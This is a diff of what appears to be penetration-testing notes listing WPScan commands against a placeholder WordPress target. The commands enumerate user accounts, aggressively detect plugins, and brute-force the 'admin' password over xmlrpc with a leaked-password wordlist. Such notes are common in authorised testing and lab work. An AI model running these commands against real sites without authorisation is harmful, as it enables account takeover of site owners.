@@ -1,3 +1,6 @@
 wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --enumerate u1-20
 wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --plugins-detection aggressive
-wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --plugins-version-detection passive --password-attack xmlrpc -U 'admin' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --plugins-version-detection passive --password-attack xmlrpc -U 'admin' -P ${SECLIST}/Passwords/darkweb2017-top1000.txt
+wpscan --url "http://$TARGET/" --no-banner --enumerate u1-20
+wpscan --url "http://$TARGET/" --no-banner --plugins-detection aggressive
+wpscan --url "http://$TARGET/" --no-banner --plugins-version-detection passive --password-attack xmlrpc -U 'admin' -P ${SECLIST}/Passwords/darkweb2017-top1000.txt
